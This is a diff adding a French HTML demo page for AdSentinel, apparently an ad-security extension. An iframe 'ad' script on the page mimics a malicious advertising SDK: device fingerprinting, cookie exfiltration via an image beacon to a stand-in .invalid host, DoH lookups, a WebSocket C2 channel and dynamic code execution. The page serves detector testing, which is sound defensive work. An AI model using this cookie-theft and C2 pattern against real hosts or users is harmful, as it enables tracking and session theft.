@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>AdSentinel – Démo</title>
+  <style>
+    :root { --bg: #fafafa; --fg: #1d1d1f; --card: #fff; --line: #ddd; }
+    @media (prefers-color-scheme: dark) { :root { --bg: #18181b; --fg: #ececf0; --card: #232328; --line: #3a3a42; } }
+    body { margin: 0; padding: 24px 16px; font: 15px/1.5 system-ui, sans-serif; background: var(--bg); color: var(--fg); }
+    main { max-width: 760px; margin: 0 auto; }
+    .ad { margin: 20px 0; padding: 12px; border: 1px dashed var(--line); border-radius: 8px; background: var(--card); }
+    iframe { width: 300px; height: 80px; border: 0; }
+    button { font: inherit; padding: 8px 16px; border-radius: 6px; border: 1px solid var(--line); background: var(--card); color: var(--fg); cursor: pointer; }
+    code { font-size: 13px; }
+  </style>
+</head>
+<body>
+<main>
+  <h1>Page de démonstration AdSentinel</h1>
+  <p>
+    Cette page simule une publicité qui reproduit, <strong>sans aucun code malveillant</strong>,
+    les comportements du SDK décrit par Confiant : empreinte de l'appareil, surveillance du comportement,
+    vol de cookies, DNS chiffré, canal C2 et exécution de code dynamique.
+  </p>
+  <p>
+    Toutes les requêtes visent des domaines en <code>.invalid</code> (qui n'existent pas) ou une adresse IP
+    réservée à la documentation : aucune donnée ne quitte ta machine.
+  </p>
+  <button id="run">Afficher la « publicité » simulée</button>
+
+  <div class="ad" id="slot">Emplacement publicitaire</div>
+
+  <p>Ouvre ensuite le popup AdSentinel : le badge doit afficher plusieurs alertes, dont une <strong>critique</strong>.</p>
+</main>
+
+<script>
+  // Faux cookies « éditeur » que la pub va tenter de voler.
+  document.cookie = '_ga=GA1.2.123456789.1700000000; path=/';
+  document.cookie = 'session_id=demo-abc123; path=/';
+
+  const AD_SCRIPT = `
+    // 1. Empreinte de l'appareil
+    const c = document.createElement('canvas');
+    c.getContext('2d').fillText('fp', 2, 10);
+    c.toDataURL();
+    const gl = document.createElement('canvas').getContext('webgl');
+    if (gl) gl.getParameter(0x9246);
+    if (navigator.getBattery) navigator.getBattery();
+
+    // 2. Surveillance du comportement
+    ['mousemove', 'keydown', 'scroll', 'visibilitychange'].forEach((t) => addEventListener(t, () => {}));
+
+    // 3. Vol de cookies (format "~~~" observé par Confiant)
+    const jar = document.cookie.split('; ').join('~~~');
+    new Image().src = 'https://pixel.adsentinel-demo.invalid/p?cookie=' + encodeURIComponent(jar);
+
+    // 4. Résolution DNS chiffrée puis contact d'une IP brute
+    fetch('https://doh.adsentinel-demo.invalid/dns-query?name=c2.example&type=A').catch(() => {});
+    fetch('https://203.0.113.10/ping', { mode: 'no-cors' }).catch(() => {});
+
+    // 5. Canal C2 et chargeur /getAd
+    try { new WebSocket('wss://adsentinel-test.invalid/c2'); } catch (e) {}
+    fetch('https://adsentinel-test.invalid/getAd?impid=demo').catch(() => {});
+
+    // 6. Exécution de code « reçu du C2 »
+    new Function('return "code distant exécuté"')();
+  `;
+
+  document.getElementById('run').addEventListener('click', () => {
+    const frame = document.createElement('iframe');
+    frame.title = 'Publicité simulée';
+    frame.srcdoc = '<body style="margin:0;font:14px system-ui;background:#2b6cb0;color:#fff;' +
+      'display:flex;align-items:center;justify-content:center;height:80px">MyIPInfo – Quelle est mon IP ?' +
+      '<scr' + 'ipt>' + AD_SCRIPT + '</scr' + 'ipt></body>';
+    document.getElementById('slot').replaceChildren(frame);
+  });
+</script>
+</body>
+</html>
